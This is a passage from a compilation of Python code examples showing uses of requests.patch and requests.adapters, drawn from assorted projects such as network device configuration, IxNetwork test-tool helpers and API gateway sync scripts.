        if mac != None: data["mac"] = mac
        return self.__query("/addresses/%s/"%orgdata['id'], method=requests.patch, data=data) 
**************************************
def close(self, issue_number):
        """
        Close an issue
        """
        edit_issue_url = "%s/%s" % (self.issues_url, issue_number)
        r = requests.patch(
            edit_issue_url,
            json={
                "state": "closed",
            },
            headers=self.headers,
        )
        r.raise_for_status() 
**************************************
def patch_request(base_request):
    """
    Performs PATCH request for the class provided.

    :param: base_request: Class with which to make request.
    :type: BaseRequest
    :return: response
    :rtype: requests.Response
    """
    (headers, _, _, _, service) = base_request.get_request_vars()

    return requests.patch(
        service, headers=headers, proxies=base_request.proxies, timeout=base_request.timeout,
        json=base_request.request_body) 
**************************************
def _patch(self, url, data=None):
        """ Abstract the requests.patch call """
        payload = self._make_payload(data)

        response = requests.patch(url,
            data=payload,
            auth=(self.username, self.password),
            verify=False)
        self._validate_response(response)
        item = response.json()

        return item 
**************************************
def enable_management_ip_address():
    for item in my_variables_in_yaml['management_addresses']:
     if item['mgmt_only']==True:
      device_id=get_device_id(item['device'])
      interface_id=get_interface_id(item['interface'], item['device'])
      address_id=get_address_id((item['device']), interface_id)
      url=url_base + 'api/dcim/devices/' + str(device_id) + '/'
      payload={
          "primary_ip4": address_id
      }
      rest_call = requests.patch(url, headers=headers, data=json.dumps(payload)) 
**************************************
def _execute_call(self, url, method='get', data=None):
        try:
            self.logger.info('Calling {}'.format(url))
            requests.packages.urllib3.disable_warnings()
            url_base = 'https://{0}:{1}/restconf/data/'.format(self.host, self.port)
            headers = {
            'Accept': 'application/yang-data+json',
            'content-type': 'application/yang-data+json'
            }
            if method == 'get':
                response = requests.get(url_base+url, auth=(self.username, self.password), headers=headers, verify=False)
            elif method == 'patch':
                response = requests.patch(url_base+url, auth=(self.username, self.password), headers=headers, verify=False, data=json.dumps(data, ensure_ascii=False))
            elif method == 'delete':
                response = requests.delete(url_base+url, auth=(self.username, self.password), headers=headers, verify=False, data=json.dumps(data, ensure_ascii=False))

            result = Result(response=response)
            result.status_code = response.status_code

            if response.status_code in HTTP_ERROR_CODES:
                result.ok = False
                result.error = HTTP_ERROR_CODES[response.status_code]

            elif response.status_code in HTTP_SERVER_ERRORS:
                result.ok = False
                result.error = HTTP_SERVER_ERRORS[response.status_code]

            elif response.status_code in HTTP_SUCCESS_CODES:
                result.ok = True
                result.message = HTTP_SUCCESS_CODES[response.status_code]

            if not response.status_code == 204:
                result.json = response.json()

            return result

                #response = requests.get(url, auth=(USER, PASS), headers=headers, verify=False)
        except Exception as e:
            self.logger.error(e) 
**************************************
def add_access_group(self, interface):
        """Function to create a IP accessgroup on IOS XE"""
        parsed_interface =re.search(r"(?P<intrfname>[A-Za-z]+)(?P<intf_num>\d((/\d+)+(\.\d+)?)|\d)",interface).groupdict()
        interface_name = parsed_interface.get('intrfname')
        interface_number = parsed_interface.get('intf_num')
        api_interface = '{0}={1}'.format(interface_name, interface_number)
        url = 'https://{0}:{1}/data/Cisco-IOS-XE-native:native/interface/{2}'.format(self.host, self.port, api_interface)
        headers = {
        'Accept': 'application/yang-data+json',
        'content-type': 'application/yang-data+json'
        }

        data = {
        "Cisco-IOS-XE-native:GigabitEthernet":[
              {
                 "name":interface_number,
                 "ip":{
                    "access-group":{
                       "in":{
                          "acl":{
                             "acl-name":"DROP",
                             "in":[None]
                          }
                       }
                    }
                 }
              }
           ]
        }

        response = self._execute_call('Cisco-IOS-XE-native:native/interface/{0}'.format(api_interface), method='patch', data=data)
        return response 
**************************************
def ixVmConfigCardId(self, cardName=None, mgmtIp='', keepAlive=300):
        """
        Description
           Add/Configure a virtual line card.

        Syntax
           http://{apiServerIp:11009}/availableHardware/virtualChassis/ixVmCard

        Parameters
           cardId:   The cardId.  Must begin with 1 and in sequential order.
           cardName: Optional: Specify a name for the card.
           mgmtIp:   The virtual line card's management IP address.
           keepAlive: Integer in seconds
        """
        url = self.sessionUrl+'/availableHardware/virtualChassis/ixVmCard'
        nextCardId = self.ixVmGetLastCardId()+1
        data = {"cardId": str(nextCardId),
                "managementIp": str(mgmtIp),
                "keepAliveTimeout": int(keepAlive)
                }
        response = self.post(url, data=data, ignoreError=True)
        if response.status_code == 400:
            print()
            for error in response.json()['errors']:
                print('\t', error['detail'])
            raise IxNetRestApiException
        
        if cardName is not None:
            self.patch(url, data={'cardName': cardName})

        ixVmCardObj = response.json()['links'][0]['href']
        return ixVmCardObj 
**************************************
def ixVmConfigPortId(self, cardUrl, portName=None, promiscuousMode='false', mtu='1500'):
        """
        Description
            Add/Configure a virtual port to the cardId.
        
        Parameters
            cardUrl:    The cardId object: /api/v1/sessions/1/ixnetwork/availableHardware/virtualChassis/ixVmCard/1
            interface:  eth1|eth2|eth3 ...
            portId:     Optional: The portId. Must begin with 1. Warning! You will have a misconfiguration if you don't begin with ID 1.
            portName:   Optional: Specify the name of the virtual port.
            promiscuousMode: true|false
            mtu:        Optional: The MTU frame size.
        """
        url = self.httpHeader+cardUrl+'/ixVmPort'
        portId = self.ixVmGetLastPortId(cardUrl)
        interface = 'eth'+str(portId)
        data = {'interface': interface,
                'portId': str(portId),
                'promiscMode': str(promiscuousMode),
                'mtu': str(mtu),
                }
        response = self.post(url, data=data)
        # /api/v1/sessions/1/ixnetwork/availableHardware/virtualChassis/ixVmCard/2/ixVmPort/1
        if portName is not None:
            self.patch(url, data={'portName': portName})

        return response.json()['links'][0]['href'] 
**************************************
def setAttribute(self,objRef,name,value):
		if self.srvUrl not in objRef:
			objRef = self.srvUrl + objRef
		name=name.lstrip("-")
		if debug:print "SET ATTRIBUTE DATA",{name:value}
		try:self.response = requests.patch(url=objRef, data=json.dumps({name:value}), headers=self.urlHeadersJson)
		except Exception, e:raise Exception('Got an error code: ', e)  
		self.checkError() 
**************************************
def patch(self, restApi, data={}, silentMode=False):
        """
        Description
           A HTTP PATCH function to modify configurations.

        Parameters
           restApi: The REST API URL.
           data: The data payload for the URL.
           silentMode: True or False.  To display URL, data and header info.
        """

        if silentMode == False:
            self.logInfo('\nPATCH: %s' % restApi)
            self.logInfo('DATA: %s' % data)
            self.logInfo('HEADERS: %s' % self.jsonHeader)

        try:
            response = requests.patch(restApi, data=json.dumps(data), headers=self.jsonHeader, verify=self.verifySslCert)
            if silentMode == False:
                print('STATUS CODE:', response.status_code)
            if not re.match('2[0-9][0-9]', str(response.status_code)):
                if 'message' in response.json() and response.json()['messsage'] != None:
                    self.logWarning('\n%s' % response.json()['message'])
                self.showErrorMessage()
                raise IxNetRestApiException('PATCH error: {0}\n'.format(response.text))
            return response
        except requests.exceptions.RequestException as errMsg:
            raise IxNetRestApiException('PATCH error: {0}\n'.format(errMsg)) 
**************************************
def linuxServerConfigGlobalLicenseServer(self, linuxServerIp, licenseServerIp, licenseMode, licenseTier):
        """
        Description
           On a new Linux API Linux installation, you need to set the global license server once.
           When a new session is created, it will check the global license settings and config the
           license settings on the new session.

        Parameters
            linuxServerIp: IP address of the Linux API server.
            licenseServerIp: Type = list. [IP address of the license server]
            licenseMode: subscription, perpetual or mixed
            licenseier: tier1, tier2, tier3

        Syntax
           PATCH: https://<apiServerIp>/api/v1/sessions/9999/ixnetworkglobals/license
           DATA:  {'servers': list(licenseServerIp),
                   'mode': str(licenseMode),
                   'tier': str(licenseTier)
                  }
        """

        staticUrl = 'https://{linuxServerIp}/api/v1/sessions/9999/ixnetworkglobals/license'.format(linuxServerIp=linuxServerIp)
        self.logInfo('\nlinuxServerConfigGlobalLicenseServer:\n\t{0}\n\t{1}\n\t{2}\n'. format(licenseServerIp,
                                                                                       licenseMode,
                                                                                       licenseTier))
        response = self.patch(staticUrl, data={'servers': [licenseServerIp], 'mode': licenseMode, 'tier': licenseTier})
        response = self.get(staticUrl)
        licenseServerIp = response.json()['servers'][0]
        licenseServerMode = response.json()['mode']
        licenseServerTier = response.json()['tier']
        self.logInfo('\nLinuxApiServer static license server:')
        self.logInfo('\t', licenseServerIp)
        self.logInfo('\t', licenseServerMode)
        self.logInfo('\t', licenseServerTier) 
**************************************
def ixVmConfigPortId(self, cardUrl, portName=None, promiscuousMode='false', mtu='1500'):
        """
        Description
            Add/Configure a virtual port to the cardId.
        
        Parameters
            cardUrl:    The cardId object: /api/v1/sessions/1/ixnetwork/availableHardware/virtualChassis/ixVmCard/1
            interface:  eth1|eth2|eth3 ...
            portId:     Optional: The portId. Must begin with 1. Warning! You will have a misconfiguration if you don't begin with ID 1.
            portName:   Optional: Specify the name of the virtual port.
            promiscuousMode: true|false
            mtu:        Optional: The MTU frame size.
        """
        url = self.httpHeader+cardUrl+'/ixVmPort'
        portId = self.ixVmGetLastPortId(cardUrl)
        interface = 'eth'+str(portId)
        data = {'interface': interface,
                'portId': str(portId),
                'promiscMode': str(promiscuousMode),
                'mtu': str(mtu),
                }
        response = self.post(url, data=data)
        # /api/v1/sessions/1/ixnetwork/availableHardware/virtualChassis/ixVmCard/2/ixVmPort/1
        if portName is not None:
            self.patch(url, data={'portName': portName})

        return response.json()['links'][0]['href'] 
**************************************
def ixVmConfigPortId(self, cardUrl, portName=None, promiscuousMode='false', mtu='1500'):
        """
        Description
            Add/Configure a virtual port to the cardId.
        
        Parameters
            cardUrl:    The cardId object: /api/v1/sessions/1/ixnetwork/availableHardware/virtualChassis/ixVmCard/1
            interface:  eth1|eth2|eth3 ...
            portId:     Optional: The portId. Must begin with 1. Warning! You will have a misconfiguration if you don't begin with ID 1.
            portName:   Optional: Specify the name of the virtual port.
            promiscuousMode: true|false
            mtu:        Optional: The MTU frame size.
        """
        url = self.httpHeader+cardUrl+'/ixVmPort'
        portId = self.ixVmGetLastPortId(cardUrl)
        interface = 'eth'+str(portId)
        data = {'interface': interface,
                'portId': str(portId),
                'promiscMode': str(promiscuousMode),
                'mtu': str(mtu),
                }
        response = self.post(url, data=data)
        # /api/v1/sessions/1/ixnetwork/availableHardware/virtualChassis/ixVmCard/2/ixVmPort/1
        if portName is not None:
            self.patch(url, data={'portName': portName})

        return response.json()['links'][0]['href'] 
**************************************
def ixVmConfigPortId(self, cardUrl, portName=None, promiscuousMode='false', mtu='1500'):
        """
        Description
            Add/Configure a virtual port to the cardId.
        
        Parameters
            cardUrl:    The cardId object: /api/v1/sessions/1/ixnetwork/availableHardware/virtualChassis/ixVmCard/1
            interface:  eth1|eth2|eth3 ...
            portId:     Optional: The portId. Must begin with 1. Warning! You will have a misconfiguration if you don't begin with ID 1.
            portName:   Optional: Specify the name of the virtual port.
            promiscuousMode: true|false
            mtu:        Optional: The MTU frame size.
        """
        url = self.httpHeader+cardUrl+'/ixVmPort'
        portId = self.ixVmGetLastPortId(cardUrl)
        interface = 'eth'+str(portId)
        data = {'interface': interface,
                'portId': str(portId),
                'promiscMode': str(promiscuousMode),
                'mtu': str(mtu),
                }
        response = self.post(url, data=data)
        # /api/v1/sessions/1/ixnetwork/availableHardware/virtualChassis/ixVmCard/2/ixVmPort/1
        if portName is not None:
            self.patch(url, data={'portName': portName})

        return response.json()['links'][0]['href'] 
**************************************
def send_veda_status(self):
        """
        VEDA Stati (as of 05-2016) [salient only to NODE],
        kept in 'globals'
        ----
        'Active Transcode'
        ----
        * This will update a video's status
        """
        for u in self.veda_video_dict:
            """
            This should just send transcode_active, as the other queue
            phases are controlled by other big veda pipeline steps
            """
            if self.VideoObject.valid is not True:
                return None
            video_data = {'video_trans_status': self.veda_video_status}

            w = requests.patch(
                '/'.join((settings['veda_api_url'], 'videos', str(u['id']), '')),
                headers=self.veda_headers,
                data=json.dumps(video_data)
            )
            if w.status_code != 200:

                logger.error('VEDA API: GET Failure, no objects') 
**************************************
def sync_apis(self, apis):
        """
        synchronizes the API definition defined on this machine with Kong.
        """
        self.load_apis()
        for name in apis:
            definition = apis[name]
            if name in self.apis:
                                # api with the same name already exists, check
                                # for update
                current = self.apis[name]
                differences = diff(current, definition, syntax='explicit')
                has_update = filter(lambda k: k.label == 'update', differences.keys())
                if len(has_update) > 0:
                    log.info('updating API definition %s.', name)
                    r = requests.patch(
                        '%s/apis/%s' % (self.admin_url, name),
                        json=definition, verify=self.verify_ssl)
                    if r.status_code == 200 or r.status_code == 201:
                        self.apis[name] = r.json()
                    else:
                        log.error('failed to update %s at %s, %s',
                                  name, self.admin_url, r.text)
                else:
                    log.info('API definition %s is up-to-date.', name)
            else:
                log.info('creating API definition %s.', name)
                r = requests.put('%s/apis/' % self.admin_url,
                                 json=definition, verify=self.verify_ssl)
                if r.status_code == 200 or r.status_code == 201:
                    self.apis[name] = r.json()
                else:
                    log.error('failed to create %s at %s, %s',
                              name, self.admin_url, r.text) 
**************************************
def create_s3_bucket(self, parameters, billing_source):
        json_data = {'billing_source': {'bucket': billing_source}}

        url = '{}/{}/'.format(self._base_url, parameters.get('source_id'))
        response = requests.patch(url, headers=self._identity_header, json=json_data)
        return response 
**************************************
def create_azure_storage(self, parameters, resource_group, storage_account):
        json_data = {'billing_source': {'data_source': {'resource_group': resource_group,
                                                        'storage_account': storage_account}}}

        url = '{}/{}/'.format(self._base_url, parameters.get('source_id'))
        response = requests.patch(url, headers=self._identity_header, json=json_data)
        return response 
**************************************
def create_azure_subscription_id(self, parameters, subscription_id):
        json_data = {'authentication': {'credentials': {'subscription_id': subscription_id}}}

        url = '{}/{}/'.format(self._base_url, parameters.get('source_id'))
        response = requests.patch(url, headers=self._identity_header, json=json_data)
        return response 
**************************************
def patch(self, url, **kwargs):
        """
        sends a patch.
        :param url:  the url to send to.
        :param kwargs: the args.
        :return:
        """
        pass 
**************************************
def patch(self, url, **kwargs):
        try:
            return requests.patch(url, timeout=0.5, **kwargs)
        except requests.exceptions.RequestException as e:
            raise RequestException("Unable to PATCH " + url) from e 
**************************************
def patch(self, url, **kwargs):
        self.record.append(('patch', url, kwargs))
        return self._resp() 
**************************************
def invoke_method(self, method, uri, query_param={}, request_param={}, headers=None, **kwargs):
        """
        Delegate requests to get/post/delete method.
        Each method implements by any http client, default client is requests.

        :param method: HTTP Method. supports GET/POST/DELETE
        :param uri: API Endpoint. 'uri' expects a URI excluded '/api/v2/' prefix
        :param query_param: dict of URL parameter. this will be url-encoded string
        :param request_param: dict of body parameter. this will use when invoke post request
        :param headers: HTTP Header dict. Recommend value is None. if None, then use default implements of http client(requests).
        :return: http response object
        """
        query_param.setdefault("apiKey", self.api_key)

        method = method.lower()

        if method == "get":
            resp = self.get(method, uri, query_param, request_param, headers, **kwargs)

        elif method == "post":
            resp = self.post(method, uri, query_param, request_param, headers, **kwargs)

        elif method == "delete":
            resp = self.delete(method, uri, query_param, request_param, headers, **kwargs)

        elif method == "patch":
            resp = self.patch(method, uri, query_param, request_param, headers, **kwargs)

        else:
            raise BacklogError("Not supported http method: {}".format(method))

        return resp 
**************************************
def patch(self, method, uri, query_param, request_param, headers, **kwargs):
        raise NotImplementedError 
**************************************
def atlas_patch(self, resource, data):
        self._log.debug(f"atlas_patch({resource}, {data})")
        return self.patch(f"{self.ATLAS_BASE_URL}{resource}", data) 
**************************************
def patch(self, resource, patch_doc):
        try:
            p = requests.patch(f"{resource}",
                               json=patch_doc,
                               headers=self.ATLAS_HEADERS,
                               auth=self._auth
                               )
            p.raise_for_status()
        except requests.exceptions.HTTPError as e:
            raise AtlasPatchError(e, p.json())
        return p.json() 
**************************************
def patch(url, data=None, **kwargs) -> AsyncResponse:
    return AsyncResponse(
        await run_sync_func(requests.patch, url=url, data=data, **kwargs)) 
**************************************
def ack_user(self, username):
        """ This will ack any incident assigned to you, even if the incident is already acked"""
        body = {"userName": username, "message": "Acked via victoropspy"}
        r = requests.patch(self.api_base_url + '/api-public/v1/incidents/byUser/ack', headers=self.headers, json=body)
        if r.ok and r.json()['results']:
            logging.info("Acknowledged these incidents:")
            for i in r.json()['results']:
                logging.info(i)
        else:
            logging.info("Nothing happened. Are there any incidents assigned to {}?".format(username)) 
**************************************
def make_api_call(method, url, token, payload = None, parameters = None):
    # Send these headers with all API calls
    headers = { 'User-Agent' : 'django-tutorial/1.0',
                'Authorization' : 'Bearer {0}'.format(token),
                'Accept' : 'application/json'}

    # Use these headers to instrument calls. Makes it easier
    # to correlate requests and responses in case of problems
    # and is a recommended best practice.
    request_id = str(uuid.uuid4())
    instrumentation = { 'client-request-id' : request_id,
                        'return-client-request-id' : 'true' }

    headers.update(instrumentation)

    response = None 

    payload = {
              "Subject": "Discuss the Calendar REST API",
              "Body": {
                "ContentType": "HTML",
                "Content": "I think it will meet our requirements!"
              },
              "Start": {
                  "DateTime": "2014-04-04T18:00:00",
                  "TimeZone": "Pacific Standard Time"
              },
              "End": {
                  "DateTime": "2014-04-04T19:00:00",
                  "TimeZone": "Pacific Standard Time"
              },
              "Attendees": [
                {
                  "EmailAddress": {
                    "Address": "[email protected]",
                    "Name": "Janet Schorr"
                  },
                  "Type": "Required"
                }
              ]
            }

    if (method.upper() == 'GET'):
        response = requests.get(url, headers = headers, params = parameters)
    elif (method.upper() == 'DELETE'):
        response = requests.delete(url, headers = headers, params = parameters)
    elif (method.upper() == 'PATCH'):
        headers.update({ 'Content-Type' : 'application/json' })
        response = requests.patch(url, headers = headers, data = json.dumps(payload), params = parameters)
    elif (method.upper() == 'POST'):
        headers.update({ 'Content-Type' : 'application/json' })
        response = requests.post(url, headers = headers, data = json.dumps(payload), params = parameters)

    return response 
**************************************
def __request_requests(self, url, method, data=None):
        out = self.empty_json
        if isinstance(data, dict):
            data = json.dumps(data)
        elif data:
            try:
                data = json.loads(data)
            except ValueError:
                print "Input not a valid JSON document"
                return 400, "Input not a valid JSON document", out
        try:
            if method == 'GET':
                return _get_requests(url, headers=self.headers,
                                     auth=(self.username, self.password),
                                     timeout=self.timeout)
            elif method == 'PUSH':
                return _post_requests(url, data=data, headers=self.headers,
                                      auth=(self.username, self.password),
                                      timeout=self.timeout)
            elif method == 'DELETE':
                r = requests.delete(url, headers=self.headers,
                                    auth=(self.username, self.password),
                                    timeout=self.timeout)
            elif method == 'PUT':
                r = requests.put(url, data=data, headers=self.headers,
                                 auth=(self.username, self.password),
                                 timeout=self.timeout)
            elif method == 'PATCH':
                r = requests.patch(url, data=data, headers=self.headers,
                                   auth=(self.username, self.password),
                                   timeout=self.timeout)
        except requests.Timeout as e:
            print "Timeout for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "Timeout for url %s: %s" % (url,e,), out
        except requests.ProxyError as e:
            print "ProxyError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ProxyError for url %s: %s" % (url,e,), out
        except requests.SSLError as e:
            print "SSLError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "SSLError for url %s: %s" % (url,e,), out
        except requests.ConnectionError as e:
            print "ConnectionError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ConnectionError for url %s: %s" % (url,e,), out
        except requests.HTTPError as e:
            print "HTTPError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "HTTPError for url %s: %s" % (url,e,), out
        except requests.RequestException as e:
            print "RequestException for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "RequestException for url %s: %s" % (url,e,), out
        return r.status_code, "OK", r.json() 
**************************************
def update_swagger(self, instance, swaggerfiles):
        sas_token = self._token_factory.get_sas_token(instance)
        base_url = self._token_factory.get_base_url(instance)
        api_version = self._token_factory.get_api_version()
        # First, find the ids of the APIs.
        api_res = requests.get(base_url + 'apis' + api_version,
                               headers = {'Authorization': sas_token})
        if (200 != api_res.status_code):
            print "Could not retrieve API information (/api endpoint)."
            print api_res.text
            return False

        apis_json = byteify(json.loads(api_res.text))

        api_id_bag = {}
        api_bag = {}
        for api_def in apis_json['value']:
            api_url = api_def['serviceUrl']
            api_id_url = api_def['id'] # /apis/3498734a389f7bc83749837493
            api_id = api_id_url[api_id_url.index('/', 2) + 1:]
            api_name = api_def['name']
            print "Found API '" + api_name + "' (id " + api_id + ")."
            api_id_bag[api_url] = api_id
            api_bag[api_url] = api_def

        for swaggerfile in swaggerfiles['swaggerFiles']:
            print "Updating '" + swaggerfile['swagger'] + "'."
            swagger_url = swaggerfile['serviceUrl']
            if swagger_url not in api_id_bag:
                print "Could not find serviceUrl '" + swagger_url + "'. Is it a new API? Import it once first in the Web UI."
                return False
            
            api_id = api_id_bag[swagger_url]
            swagger_json = self.__load_swagger(instance, swaggerfile['swagger'])
            swag_res = requests.put(base_url + 'apis/' + api_id + api_version + '&import=true',
                                    headers={'Authorization': sas_token,
                                             'If-Match': '*',
                                             'Content-Type': 'application/vnd.swagger.doc+json'},
                                    json = swagger_json)
            if (204 != swag_res.status_code):
                print "Updating the API did not succeed."
                print swag_res.status_code
                return False
            # Re-update the API definition because the Swagger import overwrites the serviceUrl
            api_res = requests.patch(base_url + 'apis/' + api_id + api_version,
                                     headers = {'Authorization': sas_token,
                                                'If-Match': '*'},
                                     json = api_bag[swagger_url])
            if (204 != api_res.status_code):
                print "Could not update serviceUrl (next update will break!)."
                print api_res.text
                return False
            print "Update succeeded."

        return True 
**************************************
def enableDisableBgpFlapNgpf(sessionUrl, action='true', upTimeInSec=0, downTimeInSec=0):
    # This API will enable or disable flapping on all the BGP interfaces.
    #
    # sessionUrl = The BGP object handle.
    #              http://10.219.117.x:11009/api/v1/sessions/1/ixnetwork/topology/1/deviceGroup/1/ethernet/1/ipv4/1/bgpIpv4Peer/1
    # 
    # action     = string format.  Not boolean.
    #              'true'  = enable BGP flap.
    #              'false' = disable BGP flap.
    #
    # upTimeInSecs   = Up Time In Seconds.  Provide an integer.
    # downTimeInSecs = Down Time In Seconds. Provide an integer.

    urlHeadersJson = {'content-type': 'application/json'}
    httpHeader = sessionUrl.split('/api')[0]
    print '\nenableBgpRouteFlapNgpf: Please wait a moment while I query for datas...'
    response = requests.get(sessionUrl)
    if response.status_code != 200:
        return 1

    # NOTE:  This will take a moment if the config is large
    # /api/v1/sessions/1/ixnetwork/multivalue/600
    flapMultivalue = response.json()['flap']

    upTimeInSecsMultivalue = response.json()['uptimeInSec']
    downTimeInSecsMultivalue = response.json()['downtimeInSec']

    print '\nenableDisableBgpFlapNgpf:', action
    response = requests.patch(httpHeader+flapMultivalue+'/singleValue',
                              data=json.dumps({'value': action}),
                              headers=urlHeadersJson)
    if response.status_code != 200:
        return 1

    print 'enableDisableBgpFlapNgpf upTimeInSec:', upTimeInSec
    response = requests.patch(httpHeader+upTimeInSecsMultivalue+'/singleValue',
                              data=json.dumps({'value': str(upTimeInSec)}),
                              headers=urlHeadersJson)
    if response.status_code != 200:
        return 1

    print 'enableDisableBgpFlapNgpf downTimeInSec:', downTimeInSec
    response = requests.patch(httpHeader+downTimeInSecsMultivalue+'/singleValue',
                              data=json.dumps({'value': str(downTimeInSec)}),
                              headers=urlHeadersJson)
    if response.status_code != 200:
        return 1 
**************************************
def ixVmConfigCardId(self, cardName=None, mgmtIp='', keepAlive=300):
        """
        Description
           Add/Configure a virtual line card.

        Syntax
           http://{apiServerIp:11009}/availableHardware/virtualChassis/ixVmCard

        Parameters
           cardId:   The cardId.  Must begin with 1 and in sequential order.
           cardName: Optional: Specify a name for the card.
           mgmtIp:   The virtual line card's management IP address.
           keepAlive: Integer in seconds
        """
        url = self.sessionUrl+'/availableHardware/virtualChassis/ixVmCard'
        nextCardId = self.ixVmGetLastCardId()+1
        data = {"cardId": str(nextCardId),
                "managementIp": str(mgmtIp),
                "keepAliveTimeout": int(keepAlive)
                }
        response = self.post(url, data=data, ignoreError=True)
        if response.status_code == 400:
            print()
            # Another card with IP 192.168.70.130 already exists on slot 1 on the chassis 192.168.70.10.
            # Commit operation failed on /availableHardware/virtualChassis/ixVmCard:L100
            for error in response.json()['errors']:
                print('\t', error['detail'])

            print('\nREMOVING existing cardID:', mgmtIp)
            self.ixVmRemoveCardId(mgmtIp)

            print('\nRETRY creating cardID:', mgmtIp)
            response = self.patch(url, data=data)
            if response.status_code == 400:
                print()
                # Another card with IP 192.168.70.130 already exists on slot 1 on the chassis 192.168.70.10.
                # Commit operation failed on /availableHardware/virtualChassis/ixVmCard:L100
                for error in response.json()['errors']:
                    print('\t', error['detail'])

            #raise IxNetRestApiException
        
        if cardName is not None:
            self.patch(url, data={'cardName': cardName})

        ixVmCardObj = response.json()['links'][0]['href']
        return ixVmCardObj 

Python requests.adapters() Examples

**************************************
def __init__(self, endpoint, session_id=None, req_session=None, args=None):
        self._endpoint = endpoint.rstrip('/')
        self._session_id = session_id
        self._args = args or dict()
        # dict structure: {ttileable_key -> graph_key, tileable_ids}
        # dict value is a tuple object which records graph key and tileable id
        self._executed_tileables = dict()

        if req_session:
            self._req_session = req_session
        else:
            import requests
            from requests.adapters import HTTPAdapter

            self._req_session = requests.Session()
            self._req_session.mount('http://stackoverflow.com', HTTPAdapter(max_retries=5))

        self._main() 
**************************************
def _set_response_ins_(self, pageurl):
        """
        Sets the response for the GET request of pageurl and stores it in self.resp

        :param pageurl: url for which we store the response.
        """
        try:
            s = requests.Session()
            a = requests.adapters.HTTPAdapter(max_retries=5)
            s.mount('http://', a)
            resp = s.get(pageurl, timeout=30)
            self.__resp_obj__ = resp
            resp.close()
        except requests.exceptions.Timeout:
            logging.error("\tVery Slow Internet Connection.")
        except requests.exceptions.ConnectionError:
            logging.error("\tNetwork Unavailable. Check your connection.")
        except requests.exceptions.MissingSchema:
            logging.error("\t503 Service Unavailable. Retrying download ... ") 
**************************************
def __init__(self, credentials,
                 refresh_status_codes=transport.DEFAULT_REFRESH_STATUS_CODES,
                 max_refresh_attempts=transport.DEFAULT_MAX_REFRESH_ATTEMPTS,
                 refresh_timeout=None,
                 **kwargs):
        super(AuthorizedSession, self).__init__(**kwargs)
        self.credentials = credentials
        self._refresh_status_codes = refresh_status_codes
        self._max_refresh_attempts = max_refresh_attempts
        self._refresh_timeout = refresh_timeout

        auth_request_session = requests.Session()

        # Using an adapter to make HTTP requests robust to network errors.
        # This adapter retrys HTTP requests when network errors occur
        # and the requests seems safely retryable.
        retry_adapter = requests.adapters.HTTPAdapter(max_retries=3)
        auth_request_session.mount("https://", retry_adapter)

        # Request instance used by internal methods (for example,
        # credentials.refresh).
        # Do not pass `self` as the session here, as it can lead to infinite
        # recursion.
        self._auth_request = Request(auth_request_session) 
**************************************
def __init__(self, credentials,
                 refresh_status_codes=transport.DEFAULT_REFRESH_STATUS_CODES,
                 max_refresh_attempts=transport.DEFAULT_MAX_REFRESH_ATTEMPTS,
                 refresh_timeout=None,
                 **kwargs):
        super(AuthorizedSession, self).__init__(**kwargs)
        self.credentials = credentials
        self._refresh_status_codes = refresh_status_codes
        self._max_refresh_attempts = max_refresh_attempts
        self._refresh_timeout = refresh_timeout

        auth_request_session = requests.Session()

        # Using an adapter to make HTTP requests robust to network errors.
        # This adapter retrys HTTP requests when network errors occur
        # and the requests seems safely retryable.
        retry_adapter = requests.adapters.HTTPAdapter(max_retries=3)
        auth_request_session.mount("https://", retry_adapter)

        # Request instance used by internal methods (for example,
        # credentials.refresh).
        # Do not pass `self` as the session here, as it can lead to infinite
        # recursion.
        self._auth_request = Request(auth_request_session) 
**************************************
def refresh(self):
        """
        Refresh session on 401. This is called automatically if your existing
        session times out and resends the operation/s which returned the
        error.

        :raises SMCConnectionError: Problem re-authenticating using existing
            api credentials
        """
        if self.session and self.session_id: # Did session timeout?
            logger.info('Session timed out, will try obtaining a new session using '
                'previously saved credential information.')
            # Preserve any custom session adapters attached to original session
            transport_adapters = self.session.adapters
            self.logout() # Force log out session just in case
            self.login(**self.copy())
            if self.session:
                for req, transport in transport_adapters.items():
                    self.session.mount(req, transport)
                return
            #return self.login(**self.copy())
        raise SMCConnectionError('Session expired and attempted refresh failed.') 
**************************************
def __init__(self, account, endpoint, user_agent=None, proxies=None, stream=False, retry_times=3, conn_timeout=5,
                 read_timeout=120, pool_connections=10, pool_maxsize=10, exception_handler_=exception_handler):
        if endpoint.endswith('/'):
            endpoint = endpoint[:-1]
        self._account = account
        self._endpoint = endpoint
        self._user_agent = user_agent or default_user_agent()
        self._proxies = proxies
        self._stream = stream
        self._retry_times = retry_times
        self._conn_timeout = conn_timeout
        self._read_timeout = read_timeout

        self._session = requests.Session()
        self._session.headers.update({Headers.ACCEPT_ENCODING: ''})

        # mount adapters with retry times
        adapter = HTTPAdapter(pool_connections=pool_connections, pool_maxsize=pool_maxsize,
                              max_retries=self._retry_times)
        self._session.mount('http://', adapter)
        self._session.mount('https://', adapter)

        # exception handler
        self._exception_handler = exception_handler_ 
**************************************
def __init__(self):
    self.headers = default_headers()
    self.auth = None
    self.proxies = {}
    self.hooks = default_hooks()
    self.params = {}
    self.stream = False
    self.verify = True
    self.cert = None
    self.max_redirects = DEFAULT_REDIRECT_LIMIT
    self.trust_env = True
    self.cookies = cookiejar_from_dict({})
    self.adapters = OrderedDict()
    self.mount('https://', HTTPAdapter())
    self.mount('http://', HTTPAdapter())
    self.redirect_cache = RecentlyUsedContainer(REDIRECT_CACHE_SIZE)

    self._get_proxies() 
**************************************
def __init__(self):
        self._config_timestamp = None
        self._mode = None

        self.authorization_endpoint = None
        self.signing_keys = None
        self.token_endpoint = None
        self.end_session_endpoint = None
        self.issuer = None

        method_whitelist = frozenset([
            'HEAD', 'GET', 'PUT', 'DELETE', 'OPTIONS', 'TRACE', 'POST'
        ])

        retry = Retry(
            total=settings.RETRIES,
            read=settings.RETRIES,
            connect=settings.RETRIES,
            backoff_factor=0.3,
            method_whitelist=method_whitelist
        )
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(max_retries=retry)
        self.session.mount('https://', adapter)
        self.session.verify = settings.CA_BUNDLE 
**************************************
def connect(self):
        if self.session:
            return True
        self._logger.debug("Attempting a connection to device")
